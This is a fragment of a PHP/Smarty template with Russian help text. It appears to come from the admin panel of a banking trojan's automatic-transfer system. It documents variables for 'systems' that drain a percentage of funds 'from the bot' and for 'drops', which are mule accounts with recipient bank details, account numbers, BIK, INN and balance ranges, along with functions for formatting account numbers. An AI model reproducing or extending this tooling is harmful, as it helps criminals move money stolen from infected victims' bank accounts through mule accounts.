<form action="#" name="zi{$rand_name}" id="zi{$rand_name}"></form>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['zi{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$lang.format_info}';
</script>
<div align="left" style="padding: 30px; white-space:pre">$system->id - Числовой ID системы.

$system->nid - ID системы A-Za-z - макс 8 символов

$system->name - Название системы

$system->percent - процент сливания с бота от суммы бота.

$system->sum - готовая сумма для перевода (т.е. сумма_которую_прислал_бот * $system->percent / 100 ) (Пример: 100.00)

$system->vat - Сумма НДС от $system->sum если НДС у дропа есть. (if($drop->vat != '0')

$system->vat = number_format((($system->sum*$system->vat)/100), '.', '');)

$system->post_date - Дата добавления системы



$drop->id - Числовой ID дропа.

$drop->name - Названия Банка получателя

$drop->receiver - Назначение

$drop->destination - Получатель

$drop->acc - Счет (без точек)

$drop->from - от баланса

$drop->to - до баланса

$drop->vat - НДС (проценты НДС, если 0 то без НДС)

$drop->system - системы для который действует дроп

$drop->last_date - дата обновления

$drop->post_date - дата добавления


$drop->other - Обьект дополнительных полей (динамический)

$drop->other['kppb'] - КПП банка

$drop->other['bik'] - БИК

$drop->other['BnkKOrrAcnt'] - Счет банка получателя

$drop->other['inn'] - ИНН

$drop->other['kppp'] - КПП получателя

$drop->citybank - Город банка получателя

$drop->other['test'] - Тестовый дроп


$trans_id - Числовой ID перевода.

Еще есть функции готовые:

accNumFormat - Сделать специальный формат счета. С точками.
Первый параметр сам счет для преобразования в нужный формат.
Второй параметр не обязательный и если true то в конец счета добавить 5 пробелов.

clearNumFormat - Удалить из счета точки и пробелы

Для удаление нулей с начала строки можно воспользоваться пхп функцией trim

ltrim - удалить с начала строки - ltrim(строка где удалить, символ для удаления)

rtrim - удалить с конца строки - rtrim(строка где удалить, символ для удаления)


</div>

